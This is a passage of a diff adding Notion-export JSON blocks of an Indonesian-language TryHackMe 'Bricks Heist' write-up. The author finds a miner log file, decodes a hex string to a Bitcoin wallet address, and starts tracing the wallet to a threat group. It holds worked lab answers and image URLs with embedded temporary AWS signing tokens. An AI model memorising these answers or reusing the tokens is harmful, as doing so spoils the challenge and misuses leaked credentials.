+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8045-8695-ceb49510c95a",
+        "type": "code",
+        "created_time": "2025-08-10T08:58:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "-rw-r--r--   1 root root   48190 Apr 11  2024 inet.conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-802e-8d60-ec10d1b08925",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:58:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "File ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dengan ukuran cukup besar seperti ini biasanya menyimpan konfigurasi atau log.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-801a-9d9d-f7b3795c8cf7",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:58:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk memastikan fungsi file ini, saya coba lihat beberapa baris pertama:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c4-9d00-dd662ac92f69",
+        "type": "code",
+        "created_time": "2025-08-10T08:58:00.000Z",
+        "last_edited_time": "2025-08-10T08:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "head -10 /lib/NetworkManager/inet.conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8065-9372-fe5769368b0e",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:54:00.000Z",
+        "last_edited_time": "2025-08-10T08:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80a9-af83-c35bcb6b47e2",
+        "type": "image",
+        "created_time": "2025-08-10T08:54:00.000Z",
+        "last_edited_time": "2025-08-10T08:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-21.png",
+          "expiry_time": "2025-09-18T13:53:35.949Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-21.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/11a3cce2-aed5-47c9-bc60-fa7bfd10878b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125335Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=b355cbbb6a39415609a3fafb09cf699068e4aca1915d58b49a57cc20b5dbd397&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805e-a5c8-d2461cb972ca",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Di sini langsung terlihat kata kunci yang mencurigakan:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8043-92d9-f401d78430ef",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\"Status: Mining!\"",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c1-8f15-e6da132def7b",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\"Bitcoin Miner Thread Started\"",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-800e-814e-e73de1caa6eb",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Ini jelas merupakan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "log dari aktivitas mining",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " yang dijalankan oleh backdoor tersebut.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8038-8891-d8426269ca68",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:00:00.000Z",
+        "last_edited_time": "2025-08-10T09:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8095-92b1-f871ac9ea998",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Nama file log dari miner instance tersebut adalah:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-808f-b7af-d8abf119819e",
+        "type": "code",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "inet.conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b7-a9ac-e4be94e8c206",
+        "type": "paragraph",
+        "created_time": "2025-08-10T08:59:00.000Z",
+        "last_edited_time": "2025-08-10T08:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "File ini kemungkinan menyimpan ID penambangan dan catatan status proses mining.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8065-9c5c-ebf7f8f5b76b",
+        "type": "paragraph",
+        "created_time": "2025-08-10T06:29:00.000Z",
+        "last_edited_time": "2025-08-10T06:29:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80ac-bd23-cc9815f42709",
+        "type": "heading_3",
+        "created_time": "2025-08-10T06:29:00.000Z",
+        "last_edited_time": "2025-08-10T08:05:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "5. What is the wallet address of the miner instance?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8092-8c58-ea4d28881aa3",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:20:00.000Z",
+        "last_edited_time": "2025-08-10T09:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada tahap sebelumnya, saya menemukan file mencurigakan bernama ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "inet.conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " di direktori ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "/lib/NetworkManager/",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ". Saat dibuka (",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "head -10 inet.conf",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "), file ini memuat log aktivitas mining, termasuk sebuah string panjang yang terlihat seperti ini:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8000-832c-ee565392f75b",
+        "type": "code",
+        "created_time": "2025-08-10T09:51:00.000Z",
+        "last_edited_time": "2025-08-10T09:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d8-a857-fb89f4246fc5",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:51:00.000Z",
+        "last_edited_time": "2025-08-10T09:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "String ini terlihat seperti ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "encoded data",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ". Dugaan awal saya: ini di-",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "encode",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dalam format ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "Hexadecimal",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80df-a6eb-ca3981f0ae9d",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:51:00.000Z",
+        "last_edited_time": "2025-08-10T09:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8088-9c8a-cc5db77e4f12",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:51:00.000Z",
+        "last_edited_time": "2025-08-10T09:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk memudahkan decode data nya, saya langsung menggunakan cyberchef.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8034-b691-d72a0a1946d8",
+        "type": "image",
+        "created_time": "2025-08-10T09:52:00.000Z",
+        "last_edited_time": "2025-08-10T09:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-22.png",
+          "expiry_time": "2025-09-18T13:53:35.959Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-22.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5c9b7f0c-d951-4202-833b-267492390077/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125335Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=938bb49bd485a26f01b55196dd25a48085b54a0c2d7192809252943df4ef0659&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8008-8cb4-f205e4b8347d",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:52:00.000Z",
+        "last_edited_time": "2025-08-10T09:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Berikut hasil decode nya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-807f-a8f1-cb8df766dac8",
+        "type": "code",
+        "created_time": "2025-08-10T09:52:00.000Z",
+        "last_edited_time": "2025-08-10T09:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80fb-83d3-cf8d403172e4",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:20:00.000Z",
+        "last_edited_time": "2025-08-10T09:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kalau kita perhatikan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c4-bc72-fda3ec29ecfa",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "bc1",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " adalah prefix umum untuk alamat Bitcoin (Bech32).",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8012-86bf-ff6b8c889369",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tapi di sini stringnya terlihat seperti ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "wallet yang di-",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "repeat",
+              "annotations": {
+                "bold": true,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dua kali:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b5-bf15-f39b88fa0a28",
+        "type": "code",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa\nbc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8041-8059-ea9398cec8c0",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kemungkinan besar ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "wallet address sebenarnya hanya yang pertama",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", panjangnya 42 karakter (standar untuk Bech32 segwit BTC address).",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80f5-87c4-d04ff28e04a9",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Jadi saya coba input ke jawaban nya, dan hasilnya benar.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-801d-8d52-e56c5b1bb727",
+        "type": "code",
+        "created_time": "2025-08-10T09:54:00.000Z",
+        "last_edited_time": "2025-08-10T09:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80fd-a3c9-cc02b84c9efc",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:54:00.000Z",
+        "last_edited_time": "2025-08-10T09:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8085-a3c8-e296a614d7c0",
+        "type": "heading_3",
+        "created_time": "2025-08-10T09:53:00.000Z",
+        "last_edited_time": "2025-08-10T09:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "6. The wallet address used has been involved in transactions between wallets belonging to which threat group?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-803c-b8e0-df0bd80ba9f8",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:54:00.000Z",
+        "last_edited_time": "2025-08-10T09:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Soal berikutnya menanyakan keterkaitan wallet ini dengan threat actor.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d7-853c-d6051befbdbd",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:55:00.000Z",
+        "last_edited_time": "2025-08-10T09:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Disini saya coba cari ke google search dengan keyword berikut ‘check wallet address bitcoin information’",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80e8-98eb-fd62030a1ca8",
+        "type": "image",
+        "created_time": "2025-08-10T09:55:00.000Z",
+        "last_edited_time": "2025-08-10T09:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-23.png",
+          "expiry_time": "2025-09-18T13:53:36.086Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-23.png",
